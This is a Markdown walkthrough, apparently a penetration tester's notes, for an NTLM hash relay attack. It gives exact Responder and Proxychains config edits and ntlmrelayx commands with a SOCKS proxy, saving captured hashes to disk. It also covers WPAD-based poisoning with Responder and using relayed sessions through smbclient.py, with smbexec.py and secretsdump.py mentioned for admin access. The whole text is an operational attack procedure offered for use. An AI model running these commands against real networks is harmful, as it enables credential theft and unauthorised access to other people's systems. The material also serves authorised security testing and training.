# How to Hash Relay

## Prerequisites

- Local network access
- SMB signing disabled on target
- Impacket (specifically "ntlmrelayx")
- Responder (with SMB and HTTP disabled)
- Proxychains4 (with localhost proxy configured)

## References

- https://infosecwriteups.com/abusing-ntlm-relay-and-pass-the-hash-for-admin-d24d0f12bea0  
- https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/  
- https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

## Step-by-Step

1. Find hosts where SMB signing is not enabled. Relay cannot occur on hsots with SMB signing. Create an input file of these hosts.
   
   - CrackMapExec
   - Nessus (filter by "SMB Signing not required")

2. Configure Responder. Modify `/etc/responder/Responder.conf` and set the following:
   
   - `SMB = Off`
   - `HTTP = Off`
   
   ![image](https://user-images.githubusercontent.com/33240393/166562653-bda3ba8c-de61-41ab-acb6-2fd16241987b.png)

3. Configure Proxychains4. Modify `/etc/proxychains4.conf` and set the last line as the following:
   
   - `socks4 127.0.0.1 1080`
   
   ![image](https://user-images.githubusercontent.com/33240393/166562934-65c687a4-3a41-426c-b3d6-955a80d4f4bb.png)

4. Run `ntlmrelayx.py` in a new terminal. Consider the following syntax:
   
   - `ntlmrelayx.py -socks -smb2support -tf inputfile.txt -of ~/ntlmrelay.out`
   - `-socks` = launch a SOCKS proxy for the connection relayed
   - `-smb2support` = adds support for SMBv2 if SMBv1 is disabled
   - `-tf` = target file
   - `-of` = output file, use this to save hashes to disk in addition to relaying!
   
   ![image](https://user-images.githubusercontent.com/33240393/166563092-5728398d-dd9d-4e43-a42d-241eeb545abc.png)

5. Run Responder concurrently in a new terminal. Consider running with WPAD for most effectiveness:
   
   - `sudo responder -I eth0 -w`
   - `-I` = interface, usually eth0
   - `-w` = WPAD support

6. Wait for Responder to receive hashes.

7. In the `ntlmrelayx` terminal, type "socks" to see active connections.
   
   ![image](https://user-images.githubusercontent.com/33240393/166563146-4d078a1c-ea28-4944-b21b-aa70ca0980c9.png)

8. When a new connection is established, access it in a new terminal by using `proxychains4` to proxy through your SOCKS proxy that `ntlmrelayx` has created for you. Consider the following syntax:
   
   - `proxychains4 /opt/impacket/examples/smbclient.py domain/username@target-ip`
   - (When prompted for a password, just hit enter - authentication is already established for you by the hash relay)
   - Other tools can be used through proxychains such as `smbexec.py` and `secretsdump.py`, but these require admin access.
   
   ![image](https://user-images.githubusercontent.com/33240393/166563176-87a5ae6f-65bd-455c-9be8-c20e49f18153.png)
   
   ![image](https://user-images.githubusercontent.com/33240393/166563201-176dd474-0b16-48c3-9782-061fe7b7c7dd.png)
